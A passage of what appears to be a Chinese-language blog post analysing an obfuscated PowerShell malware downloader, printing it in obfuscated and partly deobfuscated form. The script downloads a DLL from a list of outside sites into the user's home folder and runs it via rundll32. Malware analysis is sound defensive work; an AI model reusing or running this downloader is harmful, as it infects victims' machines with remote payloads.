class="hljs-string">&#x27;.V.A.r.I.&#x27;</span>.+.<span class="hljs-string">&#x27;.A.&#x27;</span>.+.<span class="hljs-string">&#x27;.B.L.&#x27;</span>.+.<span class="hljs-string">&#x27;.e.:.z.y.3.5.&#x27;</span>.).)...v.a.L.U.E.:.:.<span class="hljs-string">&quot;.C.`.R.e.A.`.T.e.d.`.I.r.E.c.T.o.R.y.&quot;</span>.(.<span class="hljs-variable">$</span>.H.O.M.E. .+. .(.(.(.<span class="hljs-string">&#x27;.X.E.8.Z.&#x27;</span>.+.<span class="hljs-string">&#x27;.3.t.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.n.c.&#x27;</span>.+.<span class="hljs-string">&#x27;.5.d.X.E.8.L.&#x27;</span>.).+.<span class="hljs-string">&#x27;.6.&#x27;</span>.+.<span class="hljs-string">&#x27;.z.3.&#x27;</span>.+.<span class="hljs-string">&#x27;.o.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.o.&#x27;</span>.+.<span class="hljs-string">&#x27;.3.X.&#x27;</span>.).+.<span class="hljs-string">&#x27;.E.8.&#x27;</span>.).-.R.e.P.L.A.C.e. .(.[<span class="hljs-type">.C.H.A.r.</span>].<span class="hljs-number">8.8</span>.+.[<span class="hljs-type">.C.H.A.r.</span>].<span class="hljs-number">6.9</span>.+.[<span class="hljs-type">.C.H.A.r.</span>].<span class="hljs-number">5.6</span>.).,.[<span class="hljs-type">.C.H.A.r.</span>].<span class="hljs-number">9.2</span>.).).;.<span class="hljs-variable">$</span>.M.<span class="hljs-number">9.5</span>.A.=.(.<span class="hljs-string">&#x27;.F.7.&#x27;</span>.+.<span class="hljs-string">&#x27;.0.N.&#x27;</span>.).;. . .(.L.s. . .V.A.r.i.A.B.l.e.:.Y.J.U.<span class="hljs-number">4</span>.Z.<span class="hljs-number">3</span>.)...v.a.L.u.E.:.:.<span class="hljs-string">&quot;.s.e.`.C.u.r.`.i.`.T.Y.p.`.R.o.t.O.C.o.L.&quot;</span>. .=. .(.(.<span class="hljs-string">&#x27;.T.l.s.&#x27;</span>.+.<span class="hljs-string">&#x27;.1.&#x27;</span>.).+.<span class="hljs-string">&#x27;.2.&#x27;</span>.).;.<span class="hljs-variable">$</span>.L.<span class="hljs-number">5</span>._.C.=.(.<span class="hljs-string">&#x27;.P.6.&#x27;</span>.+.<span class="hljs-string">&#x27;.7.K.&#x27;</span>.).;.<span class="hljs-variable">$</span>.V.l.z.c.z.i.<span class="hljs-number">0</span>. .=. .(.<span class="hljs-string">&#x27;.O.2.&#x27;</span>.+.<span class="hljs-string">&#x27;.8.C.&#x27;</span>.).;.<span class="hljs-variable">$</span>.P.<span class="hljs-number">4.0</span>.O.=.(.<span class="hljs-string">&#x27;.W.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.3.&#x27;</span>.+.<span class="hljs-string">&#x27;.1.C.&#x27;</span>.).).;.<span class="hljs-variable">$</span>.F.<span class="hljs-number">4</span>.m.n.q.a.f.=.<span class="hljs-variable">$</span>.H.O.M.E.+.(.(.<span class="hljs-string">&#x27;.&#123;.0.&#125;.Z.3.t.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.n.c.&#x27;</span>.+.<span class="hljs-string">&#x27;.5.d.&#x27;</span>.).+.<span class="hljs-string">&#x27;.&#123;.0.&#125;.L.6.z.3.&#x27;</span>.+.<span class="hljs-string">&#x27;.o.o.3.&#123;.0.&#x27;</span>.+.<span class="hljs-string">&#x27;.&#125;.&#x27;</span>.). . .-.f.[<span class="hljs-type">.c.H.a.r.</span>].<span class="hljs-number">9.2</span>.).+.<span class="hljs-variable">$</span>.V.l.z.c.z.i.<span class="hljs-number">0</span>.+.(.<span class="hljs-string">&#x27;...&#x27;</span>.+.(.<span class="hljs-string">&#x27;.d.l.&#x27;</span>.+.<span class="hljs-string">&#x27;.l.&#x27;</span>.).).;.<span class="hljs-variable">$</span>.J.<span class="hljs-number">0.4</span>.B.=.(.<span class="hljs-string">&#x27;.Q.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.4.0.&#x27;</span>.+.<span class="hljs-string">&#x27;.L.&#x27;</span>.).).;.<span class="hljs-variable">$</span>.M.l.<span class="hljs-number">3</span>.e.v.q.l.=.(.<span class="hljs-string">&#x27;.].&#x27;</span>.+.<span class="hljs-string">&#x27;.e.1.&#x27;</span>.+.<span class="hljs-string">&#x27;.r.[.&#x27;</span>.+.<span class="hljs-string">&#x27;.S.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.:././.a.n.&#x27;</span>.+.<span class="hljs-string">&#x27;.s.&#x27;</span>.+.<span class="hljs-string">&#x27;.v.a.t...c.o.&#x27;</span>.+.<span class="hljs-string">&#x27;.m.&#x27;</span>.+.<span class="hljs-string">&#x27;./.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.s.p.-.&#x27;</span>.+.<span class="hljs-string">&#x27;.d.&#x27;</span>.+.<span class="hljs-string">&#x27;.d.m.i.n./.f.w.&#x27;</span>.).+.<span class="hljs-string">&#x27;./.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.@.].&#x27;</span>.+.<span class="hljs-string">&#x27;.e.1.&#x27;</span>.).+.<span class="hljs-string">&#x27;.r.[.&#x27;</span>.+.<span class="hljs-string">&#x27;.S.&#x27;</span>.+.<span class="hljs-string">&#x27;.:./.&#x27;</span>.+.(.<span class="hljs-string">&#x27;./.g.i.t.&#x27;</span>.+.<span class="hljs-string">&#x27;.t.h.&#x27;</span>.+.<span class="hljs-string">&#x27;.e.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.i.n.d.&#x27;</span>.+.<span class="hljs-string">&#x27;.k.a.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.d.&#x27;</span>.+.<span class="hljs-string">&#x27;.i.r.e.&#x27;</span>.).+.<span class="hljs-string">&#x27;.c.t.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.o.r.l...c.&#x27;</span>.+.<span class="hljs-string">&#x27;.o.&#x27;</span>.).+.<span class="hljs-string">&#x27;.m.&#x27;</span>.+.<span class="hljs-string">&#x27;./.2.&#x27;</span>.+.<span class="hljs-string">&#x27;./.q.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.O.Y.&#x27;</span>.+.<span class="hljs-string">&#x27;.w.&#x27;</span>.).+.<span class="hljs-string">&#x27;.T.&#x27;</span>.+.(.<span class="hljs-string">&#x27;./.@.&#x27;</span>.+.<span class="hljs-string">&#x27;.].e.1.r.[.&#x27;</span>.+.<span class="hljs-string">&#x27;.S.&#x27;</span>.+.<span class="hljs-string">&#x27;.:./.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;./.e.l.o.g.&#x27;</span>.+.<span class="hljs-string">&#x27;.s...g.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.4.&#x27;</span>.+.<span class="hljs-string">&#x27;.g.t.e.c.h.n.&#x27;</span>.+.<span class="hljs-string">&#x27;.t.l.o.g.i.e.&#x27;</span>.).+.<span class="hljs-string">&#x27;.s.&#x27;</span>.+.(.<span class="hljs-string">&#x27;...c.o.m./.b.&#x27;</span>.+.<span class="hljs-string">&#x27;.y.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.o.&#x27;</span>.+.<span class="hljs-string">&#x27;.u.s./.v.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;./.@.&#x27;</span>.+.<span class="hljs-string">&#x27;.].e.1.r.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.[.S.:././.&#x27;</span>.+.<span class="hljs-string">&#x27;.p.a.&#x27;</span>.+.<span class="hljs-string">&#x27;.t.t.a.&#x27;</span>.+.<span class="hljs-string">&#x27;.y.&#x27;</span>.+.<span class="hljs-string">&#x27;.i.s.t.o.o.e.&#x27;</span>.).+.<span class="hljs-string">&#x27;...c.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.o.m.&#x27;</span>.+.<span class="hljs-string">&#x27;./.v.i.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.p.i.o.-.&#x27;</span>.+.<span class="hljs-string">&#x27;.z.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.e.t.w.&#x27;</span>.+.<span class="hljs-string">&#x27;.o.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.x.k.-.1.&#x27;</span>.+.<span class="hljs-string">&#x27;.h.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.m.&#x27;</span>.+.<span class="hljs-string">&#x27;.p.p./.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.c.5./.@.&#x27;</span>.+.<span class="hljs-string">&#x27;.].&#x27;</span>.).+.<span class="hljs-string">&#x27;.e.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.1.r.[.S.&#x27;</span>.+.<span class="hljs-string">&#x27;.:.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;././.r.s.&#x27;</span>.+.<span class="hljs-string">&#x27;.v.&#x27;</span>.).+.<span class="hljs-string">&#x27;.m.a.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.b.&#x27;</span>.+.<span class="hljs-string">&#x27;.i.n.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.n.&#x27;</span>.+.<span class="hljs-string">&#x27;.h...c.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.o.m.&#x27;</span>.+.<span class="hljs-string">&#x27;./.m.p.&#x27;</span>.+.<span class="hljs-string">&#x27;.-.c.o.n.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.t.&#x27;</span>.+.<span class="hljs-string">&#x27;.q.n.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.t./.1.&#x27;</span>.+.<span class="hljs-string">&#x27;.6.&#x27;</span>.+.<span class="hljs-string">&#x27;.q.T./.@.&#x27;</span>.+.<span class="hljs-string">&#x27;.].e.1.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.r.[.S.&#x27;</span>.+.<span class="hljs-string">&#x27;.s.:././.&#x27;</span>.+.<span class="hljs-string">&#x27;.e.e.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.n.&#x27;</span>.+.<span class="hljs-string">&#x27;.m.o.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.r.e.y...&#x27;</span>.+.<span class="hljs-string">&#x27;.t.&#x27;</span>.+.<span class="hljs-string">&#x27;.u.s.i.n.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.y.s.&#x27;</span>.+.<span class="hljs-string">&#x27;.s./.w.p.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.-.c.o.&#x27;</span>.+.<span class="hljs-string">&#x27;.n.t.e.&#x27;</span>.+.<span class="hljs-string">&#x27;.n.t.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;./.&#x27;</span>.+.<span class="hljs-string">&#x27;.n.u.W.&#x27;</span>.+.<span class="hljs-string">&#x27;./.@.].e.1.r.[.&#x27;</span>.).+.<span class="hljs-string">&#x27;.S.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.s.:./.&#x27;</span>.+.<span class="hljs-string">&#x27;./.&#x27;</span>.+.<span class="hljs-string">&#x27;.s.u.&#x27;</span>.+.<span class="hljs-string">&#x27;.i.e.o.p.t.&#x27;</span>.).+.<span class="hljs-string">&#x27;.o.&#x27;</span>.+.<span class="hljs-string">&#x27;.m.i.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.p.e.&#x27;</span>.+.<span class="hljs-string">&#x27;...c.o.&#x27;</span>.).+.<span class="hljs-string">&#x27;.m.&#x27;</span>.+.(.<span class="hljs-string">&#x27;./.&#x27;</span>.+.<span class="hljs-string">&#x27;.w.e.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.1.1.&#x27;</span>.+.<span class="hljs-string">&#x27;.-.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.k.n.&#x27;</span>.+.<span class="hljs-string">&#x27;.x.w.n./.&#x27;</span>.+.<span class="hljs-string">&#x27;.S.s.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.E.&#x27;</span>.+.<span class="hljs-string">&#x27;.s./.&#x27;</span>.).)...<span class="hljs-string">&quot;.R.e.P.`.L.a.`.c.E.&quot;</span>.(.(.<span class="hljs-string">&#x27;.].&#x27;</span>.+.(.<span class="hljs-string">&#x27;.e.&#x27;</span>.+.<span class="hljs-string">&#x27;.1.r.[.&#x27;</span>.).+.<span class="hljs-string">&#x27;.S.&#x27;</span>.).,.(.[<span class="hljs-type">.a.r.r.a.y.</span>].(.<span class="hljs-string">&#x27;.s.d.&#x27;</span>.,.<span class="hljs-string">&#x27;.s.w.&#x27;</span>.).,.(.<span class="hljs-string">&#x27;.h.t.&#x27;</span>.+.<span class="hljs-string">&#x27;.t.p.&#x27;</span>.).,.<span class="hljs-string">&#x27;.3.d.&#x27;</span>.).[<span class="hljs-type">.1.</span>].)...<span class="hljs-string">&quot;.S.p.L.`.i.t.&quot;</span>.(.<span class="hljs-variable">$</span>.R.<span class="hljs-number">7.1</span>.P. .+. .<span class="hljs-variable">$</span>.U.<span class="hljs-number">1</span>.u.h.<span class="hljs-number">7.4</span>.<span class="hljs-number">8</span>. .+. .<span class="hljs-variable">$</span>.X.<span class="hljs-number">4.9</span>.R.).;.<span class="hljs-variable">$</span>.I.<span class="hljs-number">1.4</span>.G.=.(.<span class="hljs-string">&#x27;.W.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.9.&#x27;</span>.+.<span class="hljs-string">&#x27;.4.G.&#x27;</span>.).).;.f.o.r.e.a.c.h. .(.<span class="hljs-variable">$</span>.Q.x.<span class="hljs-number">5.5</span>.i.z.<span class="hljs-number">5</span>. .i.n. .<span class="hljs-variable">$</span>.M.l.<span class="hljs-number">3</span>.e.v.q.l.).&#123;.t.r.y.&#123;.(...(.<span class="hljs-string">&#x27;.N.e.w.&#x27;</span>.+.<span class="hljs-string">&#x27;.-.O.b.j.&#x27;</span>.+.<span class="hljs-string">&#x27;.e.c.t.&#x27;</span>.). .s.y.S.t.E.m...n.e.T...W.E.B.c.l.i.E.n.t.)...<span class="hljs-string">&quot;.d.`.O.`.w.n.L.o.`.A.D.f.I.l.E.&quot;</span>.(.<span class="hljs-variable">$</span>.Q.x.<span class="hljs-number">5.5</span>.i.z.<span class="hljs-number">5</span>.,. .<span class="hljs-variable">$</span>.F.<span class="hljs-number">4</span>.m.n.q.a.f.).;.<span class="hljs-variable">$</span>.G.<span class="hljs-number">5.0</span>.C.=.(.<span class="hljs-string">&#x27;.U.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.3.7.&#x27;</span>.+.<span class="hljs-string">&#x27;.W.&#x27;</span>.).).;.I.f. .(.(.&amp;.(.<span class="hljs-string">&#x27;.G.e.t.-.&#x27;</span>.+.<span class="hljs-string">&#x27;.I.t.e.&#x27;</span>.+.<span class="hljs-string">&#x27;.m.&#x27;</span>.). .<span class="hljs-variable">$</span>.F.<span class="hljs-number">4</span>.m.n.q.a.f.)...<span class="hljs-string">&quot;.L.E.N.`.G.t.h.&quot;</span>. .-.g.e. .<span class="hljs-number">3.1</span>.<span class="hljs-number">9.6</span>.<span class="hljs-number">3</span>.). .&#123;.&amp;.(.<span class="hljs-string">&#x27;.r.&#x27;</span>.+.<span class="hljs-string">&#x27;.u.n.d.l.&#x27;</span>.+.<span class="hljs-string">&#x27;.l.3.2.&#x27;</span>.). .<span class="hljs-variable">$</span>.F.<span class="hljs-number">4</span>.m.n.q.a.f.,.(.(.<span class="hljs-string">&#x27;.C.&#x27;</span>.+.<span class="hljs-string">&#x27;.o.n.t.r.o.&#x27;</span>.+.<span class="hljs-string">&#x27;.1._.R.u.&#x27;</span>.).+.<span class="hljs-string">&#x27;.n.D.&#x27;</span>.+.<span class="hljs-string">&#x27;.L.&#x27;</span>.+.<span class="hljs-string">&#x27;.L.&#x27;</span>.)...<span class="hljs-string">&quot;.t.`.O.s.`.T.r.I.N.G.&quot;</span>.(.).;.<span class="hljs-variable">$</span>.H.<span class="hljs-number">3.7</span>.C.=.(.<span class="hljs-string">&#x27;.H.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.3.0.&#x27;</span>.+.<span class="hljs-string">&#x27;.J.&#x27;</span>.).).;.b.r.e.a.k.;.<span class="hljs-variable">$</span>.K.<span class="hljs-number">4</span>._.Q.=.(.<span class="hljs-string">&#x27;.M.1.&#x27;</span>.+.<span class="hljs-string">&#x27;.6.Q.&#x27;</span>.).&#125;.&#125;.c.a.t.c.h.&#123;.&#125;.&#125;.<span class="hljs-variable">$</span>.B.<span class="hljs-number">7.2</span>.H.=.(.<span class="hljs-string">&#x27;.S.&#x27;</span>.+.(.<span class="hljs-string">&#x27;._._.&#x27;</span>.+.<span class="hljs-string">&#x27;.X.&#x27;</span>.).).<br></code></pre></td></tr></table></figure>
+
+<p>手动处理一下一些混淆, 删除”.”，得到</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sEt</span> (<span class="hljs-string">&quot;Zy3&quot;</span>+<span class="hljs-string">&quot;5&quot;</span>) ([<span class="hljs-type">TyPe</span>](<span class="hljs-string">&quot;&#123;2&#125;&#123;5&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-string">&#x27;IReC&#x27;</span>,<span class="hljs-string">&#x27;To&#x27;</span>,<span class="hljs-string">&#x27;SyStEM&#x27;</span>,<span class="hljs-string">&#x27;RY&#x27;</span>,<span class="hljs-string">&#x27;OD&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>) );<br><span class="hljs-built_in">Set-ITEM</span> variABle:YJu4z3 ([<span class="hljs-type">Type</span>](<span class="hljs-string">&quot;&#123;4&#125;&#123;5&#125;&#123;3&#125;&#123;6&#125;&#123;1&#125;&#123;7&#125;&#123;0&#125;&#123;2&#125;&quot;</span> <span class="hljs-operator">-f</span><span class="hljs-string">&#x27;ce&#x27;</span>,<span class="hljs-string">&#x27;eTSeRV&#x27;</span>,<span class="hljs-string">&#x27;pOinTMANAgEr&#x27;</span>,<span class="hljs-string">&#x27;Stem&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>)  );<br><span class="hljs-variable">$ErrorActionPreference</span> = ((<span class="hljs-string">&#x27;S&#x27;</span>+<span class="hljs-string">&#x27;ile&#x27;</span>)+<span class="hljs-string">&#x27;n&#x27;</span>+(<span class="hljs-string">&#x27;tl&#x27;</span>+<span class="hljs-string">&#x27;yCo&#x27;</span>)+<span class="hljs-string">&#x27;n&#x27;</span>+(<span class="hljs-string">&#x27;t&#x27;</span>+<span class="hljs-string">&#x27;inue&#x27;</span>));<br><span class="hljs-variable">$U1uh748</span>=<span class="hljs-variable">$E34H</span> + [<span class="hljs-built_in">char</span>](<span class="hljs-number">64</span>) + <span class="hljs-variable">$G35Q</span>;<br><span class="hljs-variable">$B62Q</span>=((<span class="hljs-string">&#x27;L&#x27;</span>+<span class="hljs-string">&#x27;03&#x27;</span>)+<span class="hljs-string">&#x27;K&#x27;</span>);<br> (  <span class="hljs-built_in">dir</span>  (<span class="hljs-string">&#x27;VArI&#x27;</span>+<span class="hljs-string">&#x27;A&#x27;</span>+<span class="hljs-string">&#x27;BL&#x27;</span>+<span class="hljs-string">&#x27;e:zy35&#x27;</span>))<br>vaLUE::<span class="hljs-string">&quot;C`ReA`Ted`IrEcToRy&quot;</span> (<span class="hljs-variable">$HOME</span> + (((<span class="hljs-string">&#x27;XE8Z&#x27;</span>+<span class="hljs-string">&#x27;3t&#x27;</span>)+(<span class="hljs-string">&#x27;nc&#x27;</span>+<span class="hljs-string">&#x27;5dXE8L&#x27;</span>)+<span class="hljs-string">&#x27;6&#x27;</span>+<span class="hljs-string">&#x27;z3&#x27;</span>+<span class="hljs-string">&#x27;o&#x27;</span>+(<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;3X&#x27;</span>)+<span class="hljs-string">&#x27;E8&#x27;</span>)<span class="hljs-operator">-RePLACe</span> ([<span class="hljs-built_in">CHAr</span>]<span class="hljs-number">88</span>+[<span class="hljs-built_in">CHAr</span>]<span class="hljs-number">69</span>+[<span class="hljs-built_in">CHAr</span>]<span class="hljs-number">56</span>),[<span class="hljs-built_in">CHAr</span>]<span class="hljs-number">92</span>));<br><span class="hljs-variable">$M95A</span>=(<span class="hljs-string">&#x27;F7&#x27;</span>+<span class="hljs-string">&#x27;0N&#x27;</span>);<br>(<span class="hljs-built_in">Ls</span>  VAriABle:YJU4Z3)vaLuE::<span class="hljs-string">&quot;se`Cur`i`TYp`RotOCoL&quot;</span> = ((<span class="hljs-string">&#x27;Tls&#x27;</span>+<span class="hljs-string">&#x27;1&#x27;</span>)+<span class="hljs-string">&#x27;2&#x27;</span>);<br><span class="hljs-variable">$L5_C</span>=(<span class="hljs-string">&#x27;P6&#x27;</span>+<span class="hljs-string">&#x27;7K&#x27;</span>);<br><span class="hljs-variable">$Vlzczi0</span> = (<span class="hljs-string">&#x27;O2&#x27;</span>+<span class="hljs-string">&#x27;8C&#x27;</span>);<br><span class="hljs-variable">$P40O</span>=(<span class="hljs-string">&#x27;W&#x27;</span>+(<span class="hljs-string">&#x27;3&#x27;</span>+<span class="hljs-string">&#x27;1C&#x27;</span>));<br><span class="hljs-variable">$F4mnqaf</span>=<span class="hljs-variable">$HOME</span>+((<span class="hljs-string">&#x27;&#123;0&#125;Z3t&#x27;</span>+(<span class="hljs-string">&#x27;nc&#x27;</span>+<span class="hljs-string">&#x27;5d&#x27;</span>)+<span class="hljs-string">&#x27;&#123;0&#125;L6z3&#x27;</span>+<span class="hljs-string">&#x27;oo3&#123;0&#x27;</span>+<span class="hljs-string">&#x27;&#125;&#x27;</span>) <span class="hljs-operator">-f</span>[<span class="hljs-built_in">cHar</span>]<span class="hljs-number">92</span>)+<span class="hljs-variable">$Vlzczi0</span>+(<span class="hljs-string">&#x27;&#x27;</span>+(<span class="hljs-string">&#x27;dl&#x27;</span>+<span class="hljs-string">&#x27;l&#x27;</span>));<br><span class="hljs-variable">$J04B</span>=(<span class="hljs-string">&#x27;Q&#x27;</span>+(<span class="hljs-string">&#x27;40&#x27;</span>+<span class="hljs-string">&#x27;L&#x27;</span>));<br><span class="hljs-variable">$Ml3evql</span>=(<span class="hljs-string">&#x27;]&#x27;</span>+<span class="hljs-string">&#x27;e1&#x27;</span>+<span class="hljs-string">&#x27;r[&#x27;</span>+<span class="hljs-string">&#x27;S&#x27;</span>+(<span class="hljs-string">&#x27;://an&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>+<span class="hljs-string">&#x27;vatco&#x27;</span>+<span class="hljs-string">&#x27;m&#x27;</span>+<span class="hljs-string">&#x27;/&#x27;</span>)+(<span class="hljs-string">&#x27;sp-&#x27;</span>+<span class="hljs-string">&#x27;d&#x27;</span>+<span class="hljs-string">&#x27;dmin/fw&#x27;</span>)+<span class="hljs-string">&#x27;/&#x27;</span>+(<span class="hljs-string">&#x27;@]&#x27;</span>+<span class="hljs-string">&#x27;e1&#x27;</span>)+<span class="hljs-string">&#x27;r[&#x27;</span>+<span class="hljs-string">&#x27;S&#x27;</span>+<span class="hljs-string">&#x27;:/&#x27;</span>+(<span class="hljs-string">&#x27;/git&#x27;</span>+<span class="hljs-string">&#x27;th&#x27;</span>+<span class="hljs-string">&#x27;e&#x27;</span>)+(<span class="hljs-string">&#x27;ind&#x27;</span>+<span class="hljs-string">&#x27;ka&#x27;</span>)+(<span class="hljs-string">&#x27;d&#x27;</span>+<span class="hljs-string">&#x27;ire&#x27;</span>)+<span class="hljs-string">&#x27;ct&#x27;</span>+(<span class="hljs-string">&#x27;orlc&#x27;</span>+<span class="hljs-string">&#x27;o&#x27;</span>)+<span class="hljs-string">&#x27;m&#x27;</span>+<span class="hljs-string">&#x27;/2&#x27;</span>+<span class="hljs-string">&#x27;/q&#x27;</span>+(<span class="hljs-string">&#x27;OY&#x27;</span>+<span class="hljs-string">&#x27;w&#x27;</span>)+<span class="hljs-string">&#x27;T&#x27;</span>+(<span class="hljs-string">&#x27;/@&#x27;</span>+<span class="hljs-string">&#x27;]e1r[&#x27;</span>+<span class="hljs-string">&#x27;S&#x27;</span>+<span class="hljs-string">&#x27;:/&#x27;</span>)+(<span class="hljs-string">&#x27;/elog&#x27;</span>+<span class="hljs-string">&#x27;sg&#x27;</span>)+(<span class="hljs-string">&#x27;4&#x27;</span>+<span class="hljs-string">&#x27;gtechn&#x27;</span>+<span class="hljs-string">&#x27;tlogie&#x27;</span>)+<span class="hljs-string">&#x27;s&#x27;</span>+(<span class="hljs-string">&#x27;com/b&#x27;</span>+<span class="hljs-string">&#x27;y&#x27;</span>)+(<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;us/v&#x27;</span>)+(<span class="hljs-string">&#x27;/@&#x27;</span>+<span class="hljs-string">&#x27;]e1r&#x27;</span>)+(<span class="hljs-string">&#x27;[S://&#x27;</span>+<span class="hljs-string">&#x27;pa&#x27;</span>+<span class="hljs-string">&#x27;tta&#x27;</span>+<span class="hljs-string">&#x27;y&#x27;</span>+<span class="hljs-string">&#x27;istooe&#x27;</span>)+<span class="hljs-string">&#x27;c&#x27;</span>+(<span class="hljs-string">&#x27;om&#x27;</span>+<span class="hljs-string">&#x27;/vi&#x27;</span>)+(<span class="hljs-string">&#x27;pio-&#x27;</span>+<span class="hljs-string">&#x27;z&#x27;</span>)+(<span class="hljs-string">&#x27;etw&#x27;</span>+<span class="hljs-string">&#x27;o&#x27;</span>)+(<span class="hljs-string">&#x27;xk-1&#x27;</span>+<span class="hljs-string">&#x27;h&#x27;</span>)+(<span class="hljs-string">&#x27;m&#x27;</span>+<span class="hljs-string">&#x27;pp/&#x27;</span>)+(<span class="hljs-string">&#x27;c5/@&#x27;</span>+<span class="hljs-string">&#x27;]&#x27;</span>)+<span class="hljs-string">&#x27;e&#x27;</span>+(<span class="hljs-string">&#x27;1r[S&#x27;</span>+<span class="hljs-string">&#x27;:&#x27;</span>)+(<span class="hljs-string">&#x27;//rs&#x27;</span>+<span class="hljs-string">&#x27;v&#x27;</span>)+<span class="hljs-string">&#x27;ma&#x27;</span>+(<span class="hljs-string">&#x27;b&#x27;</span>+<span class="hljs-string">&#x27;in&#x27;</span>)+(<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-string">&#x27;hc&#x27;</span>)+(<span class="hljs-string">&#x27;om&#x27;</span>+<span class="hljs-string">&#x27;/mp&#x27;</span>+<span class="hljs-string">&#x27;-con&#x27;</span>)+(<span class="hljs-string">&#x27;t&#x27;</span>+<span class="hljs-string">&#x27;qn&#x27;</span>)+(<span class="hljs-string">&#x27;t/1&#x27;</span>+<span class="hljs-string">&#x27;6&#x27;</span>+<span class="hljs-string">&#x27;qT/@&#x27;</span>+<span class="hljs-string">&#x27;]e1&#x27;</span>)+(<span class="hljs-string">&#x27;r[S&#x27;</span>+<span class="hljs-string">&#x27;s://&#x27;</span>+<span class="hljs-string">&#x27;ee&#x27;</span>)+(<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-string">&#x27;mo&#x27;</span>)+(<span class="hljs-string">&#x27;rey&#x27;</span>+<span class="hljs-string">&#x27;t&#x27;</span>+<span class="hljs-string">&#x27;usin&#x27;</span>)+(<span class="hljs-string">&#x27;ys&#x27;</span>+<span class="hljs-string">&#x27;s/wp&#x27;</span>)+(<span class="hljs-string">&#x27;-co&#x27;</span>+<span class="hljs-string">&#x27;nte&#x27;</span>+<span class="hljs-string">&#x27;nt&#x27;</span>)+(<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-string">&#x27;nuW&#x27;</span>+<span class="hljs-string">&#x27;/@]e1r[&#x27;</span>)+<span class="hljs-string">&#x27;S&#x27;</span>+(<span class="hljs-string">&#x27;s:/&#x27;</span>+<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-string">&#x27;su&#x27;</span>+<span class="hljs-string">&#x27;ieopt&#x27;</span>)+<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;mi&#x27;</span>+(<span class="hljs-string">&#x27;pe&#x27;</span>+<span class="hljs-string">&#x27;co&#x27;</span>)+<span class="hljs-string">&#x27;m&#x27;</span>+(<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-string">&#x27;we&#x27;</span>)+(<span class="hljs-string">&#x27;11&#x27;</span>+<span class="hljs-string">&#x27;-&#x27;</span>)+(<span class="hljs-string">&#x27;kn&#x27;</span>+<span class="hljs-string">&#x27;xwn/&#x27;</span>+<span class="hljs-string">&#x27;Ss&#x27;</span>)+(<span class="hljs-string">&#x27;E&#x27;</span>+<span class="hljs-string">&#x27;s/&#x27;</span>)).replace((<span class="hljs-string">&#x27;]&#x27;</span>+(<span class="hljs-string">&#x27;e&#x27;</span>+<span class="hljs-string">&#x27;1r[&#x27;</span>)+<span 